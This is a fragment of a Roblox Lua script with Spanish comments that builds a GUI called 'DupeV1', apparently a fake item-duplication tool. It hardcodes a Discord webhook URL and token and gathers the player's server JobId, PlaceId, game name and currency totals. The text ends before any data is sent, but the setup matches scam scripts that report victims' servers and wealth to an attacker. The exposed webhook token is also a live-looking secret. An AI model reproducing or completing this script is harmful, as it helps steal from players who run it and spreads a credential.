local webhookURL = "https://discord.com/api/webhooks/1462867777542160508/OadWH0VvwwOTrF62mKzYF0tJhHJEre9yUgK7s66afaXBEpM4bu8relHZB6FjrdTNcark"

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local JobId = game.JobId
local PlaceId = game.PlaceId

-- 1. DETECCI√ìN DE DATOS
local gameName = "Desconocido"
local s, info = pcall(function() return MarketplaceService:GetProductInfo(PlaceId) end)
if s then gameName = info.Name end

local function getStats()
    local money = "0"
    local stats = player:FindFirstChild("leaderstats") or player:FindFirstChild("Data")
    if stats then
        local val = stats:FindFirstChild("Money") or stats:FindFirstChild("Coins") or stats:FindFirstChild("Brainrots") or stats:FindFirstChild("Gems")
        if val then money = tostring(val.Value) end
    end
    return money
end

-- 2. INTERFAZ GR√ÅFICA (GUI)
local pgui = player:WaitForChild("PlayerGui")
if pgui:FindFirstChild("DupeV1") then pgui.DupeV1:Destroy() end
